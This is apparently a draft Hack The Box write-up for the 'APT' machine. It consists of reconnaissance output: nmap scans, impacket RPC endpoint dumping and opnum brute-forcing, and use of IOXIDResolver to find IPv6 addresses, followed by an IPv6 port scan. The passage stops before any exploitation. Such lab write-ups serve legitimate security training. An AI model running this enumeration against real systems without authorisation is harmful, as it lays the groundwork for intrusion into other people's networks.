---
title: HTB-APT Writeup
date: 2026-04-24T14:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ sudo nmap --min-rate 10000 -p- 10.129.96.60 -oA Nmap/ports 
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 02:22 -0400
Nmap scan report for 10.129.96.60
Host is up (0.14s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds

```

```bzsh
┌──(kali㉿kali)-[~/Work/Kali/APT]                              
└─$ sudo nmap -sT -sC -sV -O -p80,135 10.129.96.60             
[sudo] password for kali:                                                                                                     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 02:28 -0400                                                             
Nmap scan report for 10.129.96.60                                                                                             
Host is up (0.14s latency).                                                                                                   
                                                                                                                              
PORT    STATE SERVICE VERSION                                  
80/tcp  open  http    Microsoft IIS httpd 10.0                                                                                
|_http-title: Gigantic Hosting | Home                          
| http-methods:                                                                                                               
|_  Potentially risky methods: TRACE                                                                                          
|_http-server-header: Microsoft-IIS/10.0                       
135/tcp open  msrpc   Microsoft Windows RPC                                                                                   
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                         
Device type: general purpose                                                                                                  
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)                                                             
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).                                                                     
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                      
                                                                                                                              
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                         
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ impacket-rpcdump @10.129.96.60 | tee rpcdump.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Retrieving endpoint list from 10.129.96.60
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\APT[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc06EBD0]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\APT[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc06EBD0]
          ncalrpc:[WMsgKRpc0719C1]

Protocol: N/A 
Provider: N/A 
UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0 
Bindings: 
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-dfe91df095c044bb9c]
          ncalrpc:[LRPC-482d9e1fb1f3c8d738]
          ncacn_np:\\APT[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-6776d2b1d2224ad112]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-482d9e1fb1f3c8d738]
          ncacn_np:\\APT[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-6776d2b1d2224ad112]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-5518a4e14cce971efc]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: N/A 
Provider: N/A 
UUID    : 697DCDA9-3BA9-4EB2-9247-E11F1901B0D2 v1.0 
Bindings: 
          ncalrpc:[LRPC-dfe91df095c044bb9c]
          ncalrpc:[LRPC-482d9e1fb1f3c8d738]
          ncacn_np:\\APT[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-6776d2b1d2224ad112]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

Protocol: N/A 
Provider: sysntfy.dll 
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
Bindings: 
          ncalrpc:[LRPC-6776d2b1d2224ad112]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[LRPC-51a99d2f031729a033]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: N/A 
Provider: nsisvc.dll 
UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
Bindings: 
          ncalrpc:[LRPC-30cc37b46078780df5]

Protocol: N/A 
Provider: N/A 
UUID    : A500D4C6-0DD1-4543-BC0C-D5F93486EAF8 v1.0 
Bindings: 
          ncalrpc:[LRPC-9be68673bb5816307e]
          ncalrpc:[LRPC-5518a4e14cce971efc]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: N/A 
Provider: dhcpcsvc.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: N/A 
Provider: dhcpcsvc6.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
Provider: wevtsvc.dll 
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: N/A 
Provider: nrpsrv.dll 
UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
Bindings: 
          ncalrpc:[LRPC-87bb01b179bd53d612]

Protocol: N/A 
Provider: IKEEXT.DLL 
UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
Bindings: 
          ncalrpc:[LRPC-b99e0002eb5b46f805]
          ncacn_ip_tcp:10.129.96.60[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : 0D3C7F20-1C8D-4654-A1B3-51563B298BDA v1.0 UserMgrCli
Bindings: 
          ncalrpc:[LRPC-b99e0002eb5b46f805]
          ncacn_ip_tcp:10.129.96.60[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : B18FBAB6-56F8-4702-84E0-41053293A869 v1.0 UserMgrCli
Bindings: 
          ncalrpc:[LRPC-b99e0002eb5b46f805]
          ncacn_ip_tcp:10.129.96.60[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: schedsvc.dll 
UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
Bindings: 
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
Bindings: 
          ncacn_np:\\APT[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: schedsvc.dll 
UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
Bindings: 
          ncalrpc:[senssvc]
          ncalrpc:[OLEB83DCC91F4EFED195E8FB2B901E7]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: gpsvc.dll 
UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 Group Policy RPC Interface
Bindings: 
          ncalrpc:[LRPC-1aca0fdf318389c4d6]

Protocol: N/A 
Provider: N/A 
UUID    : 7F1343FE-50A9-4927-A778-0C5859517BAC v1.0 DfsDs service
Bindings: 
          ncacn_np:\\APT[\PIPE\wkssvc]
          ncalrpc:[LRPC-3f54d0f5b16ef87933]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : EB081A0D-10EE-478A-A1DD-50995283E7A8 v3.0 Witness Client Test Interface
Bindings: 
          ncalrpc:[LRPC-3f54d0f5b16ef87933]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : F2C9B409-C1C9-4100-8639-D8AB1486694A v1.0 Witness Client Upcall Server
Bindings: 
          ncalrpc:[LRPC-3f54d0f5b16ef87933]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : DF4DF73A-C52D-4E3A-8003-8437FDF8302A v0.0 WM_WindowManagerRPC\Server
Bindings: 
          ncalrpc:[LRPC-8da1b75755b1dd1252]
          ncalrpc:[LRPC-5f898e5a7f44d42087]
          ncalrpc:[LRPC-4adbc567885118331d]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-5f898e5a7f44d42087]
          ncalrpc:[LRPC-4adbc567885118331d]

Protocol: N/A 
Provider: N/A 
UUID    : F47433C3-3E9D-4157-AAD4-83AA1F5C2D4C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-5f898e5a7f44d42087]
          ncalrpc:[LRPC-4adbc567885118331d]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-5f898e5a7f44d42087]
          ncalrpc:[LRPC-4adbc567885118331d]

Protocol: N/A 
Provider: BFE.DLL 
UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
Bindings: 
          ncalrpc:[LRPC-4adbc567885118331d]

Protocol: [MS-NRPC]: Netlogon Remote Protocol 
Provider: netlogon.dll 
UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
Bindings: 
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.96.60[49670]
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: [MS-RAA]: Remote Authorization API Protocol 
Provider: N/A 
UUID    : 0B1C2170-5732-4E0E-8CD3-D9B16F3B84D7 v0.0 RemoteAccessCheck
Bindings: 
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.96.60[49670]
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.96.60[49670]
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: N/A 
Provider: efssvc.dll 
UUID    : 04EEB297-CBF4-466B-8A2A-BFD6A2F10BBA v1.0 EFSK RPC Interface
Bindings: 
          ncacn_np:\\APT[\pipe\efsrpc]
          ncalrpc:[LRPC-5e90a7a29e78c9a534]

Protocol: N/A 
Provider: efssvc.dll 
UUID    : DF1941C5-FE89-4E79-BF10-463657ACF44D v1.0 EFS RPC Interface
Bindings: 
          ncacn_np:\\APT[\pipe\efsrpc]
          ncalrpc:[LRPC-5e90a7a29e78c9a534]

Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
Provider: samsrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49670]
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
Provider: lsasrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
Bindings: 
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
Provider: ntdsai.dll 
UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
Bindings: 
          ncacn_np:\\APT[\pipe\afaf47e1b2411065]
          ncacn_http:10.129.96.60[49669]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEF9F2A68D19390C2D5CF72A4E5C6E]
          ncacn_ip_tcp:10.129.96.60[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\APT[\pipe\lsass]

Protocol: N/A 
Provider: N/A 
UUID    : 1A0D010F-1C33-432C-B0F5-8CF4E8053099 v1.0 IdSegSrv service
Bindings: 
          ncalrpc:[LRPC-8078135225efbb5b8f]

Protocol: N/A 
Provider: srvsvc.dll 
UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
Bindings: 
          ncalrpc:[LRPC-8078135225efbb5b8f]

Protocol: N/A 
Provider: N/A 
UUID    : E38F5360-8572-473E-B696-1B46873BEEAB v1.0 
Bindings: 
          ncalrpc:[LRPC-bf0e939a62bee98f54]

Protocol: N/A 
Provider: N/A 
UUID    : 4C9DBF19-D39E-4BB9-90EE-8F7179B20283 v1.0 
Bindings: 
          ncalrpc:[LRPC-bf0e939a62bee98f54]

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
Provider: services.exe 
UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49673]

Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Provider: msdtcprx.dll 
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
Bindings: 
          ncalrpc:[LRPC-2ad27d55b08df6418f]
          ncalrpc:[OLECA8C3BF392631CDB261C83F03BB9]
          ncalrpc:[LRPC-ccb018144f6a1494e4]
          ncalrpc:[LRPC-ccb018144f6a1494e4]
          ncalrpc:[LRPC-ccb018144f6a1494e4]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 12E65DD8-887F-41EF-91BF-8D816C42C2E7 v1.0 Secure Desktop LRPC interface
Bindings: 
          ncalrpc:[WMsgKRpc0719C1]

Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
Provider: dns.exe 
UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49680]

Protocol: [MS-FRS2]: Distributed File System Replication Protocol 
Provider: dfsrmig.exe 
UUID    : 897E2E5F-93F3-4376-9C9C-FD2277495C27 v1.0 Frs2 Service
Bindings: 
          ncacn_ip_tcp:10.129.96.60[49688]
          ncalrpc:[OLE6B997E1E78897548989AED7AE4CE]

[*] Received 265 endpoints.

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ impacket-rpcmap ncacn_ip_tcp:10.129.96.60[135]
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ impacket-rpcmap ncacn_ip_tcp:10.129.96.60[135] -brute-uuids -brute-opnums
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0
Opnums 0-64: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2
Opnums 0-64: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0
Opnums 0-64: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success
Opnums 6-64: nca_s_op_rng_error (opnum not found)

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0
Opnum 0: success
Opnum 1: rpc_x_bad_stub_data
Opnum 2: success
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnums 5-64: nca_s_op_rng_error (opnum not found)

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0
Opnum 0: rpc_fault_cant_perform
Opnum 1: rpc_fault_cant_perform
Opnum 2: rpc_x_bad_stub_data
Opnum 3: rpc_x_bad_stub_data
Opnum 4: rpc_x_bad_stub_data
Opnum 5: rpc_fault_cant_perform
Opnum 6: rpc_fault_cant_perform
Opnum 7: rpc_x_bad_stub_data
Opnum 8: rpc_x_bad_stub_data
Opnums 9-64: nca_s_op_rng_error (opnum not found)

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0
Opnums 0-64: rpc_s_access_denied

[*] Tested 354 UUID(s)

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ wget https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
--2026-04-24 03:42:03--  https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 198.18.0.50
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|198.18.0.50|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1312 (1.3K) [text/plain]                  
Saving to: ‘IOXIDResolver.py’                                                                            

IOXIDResolver.py                                     100%[====================================================================================================================>]   1.28K  --.-KB/s    in 0s      
                                                    
2026-04-24 03:42:04 (65.7 MB/s) - ‘IOXIDResolver.py’ saved [1312/1312]

                                                    
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ chmod +X IOXIDResolver.py

┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ ./IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::8581:ea2c:ca5e:aa12
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::15c
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ vim ipv6_add     
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ cat ipv6_add             
Address: 10.129.96.60
Address: dead:beef::8581:ea2c:ca5e:aa12
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::15c

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ sudo nmap  -6 --min-rate 10000 -p- dead:beef::8581:ea2c:ca5e:aa12 -oA Nmap/ports_ipv6
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 03:51 -0400
Nmap scan report for dead:beef::8581:ea2c:ca5e:aa12
Host is up (0.14s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49680/tcp open  unknown
49688/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.93 seconds
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/APT]
└─$ grep open Nmap/ports_ipv6.nmap | awk -F '/' '{print $1}' | paste -sd ','
